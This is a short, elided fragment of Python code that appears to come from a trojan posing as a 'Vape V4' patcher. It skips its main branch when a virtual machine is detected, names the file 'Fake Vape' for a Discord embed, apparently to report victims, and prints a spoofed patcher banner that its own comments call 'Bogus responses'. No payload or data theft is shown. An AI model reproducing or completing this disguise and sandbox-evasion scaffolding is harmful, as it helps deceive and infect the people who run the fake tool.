...
if VM_DETECTED == False: # No VM.
    ...
    FILE_NAME = "Fake Vape" # Name of file your giving out (For Discord embed).
    ...
    # GUI / Spoof vape.
    print()
    print(Fore.WHITE + str(PREFETCH) + Fore.RED + "Vape V4 v4.2 Patcher v2.1")
    print()
    ...
    print()
    print(Fore.WHITE + str(PREFETCH) + Fore.RED + "Vape V4 v4.2 Patcher v2.1") # Bogus responses.
    print()
    time.sleep(3)
    for i in range(0,3):
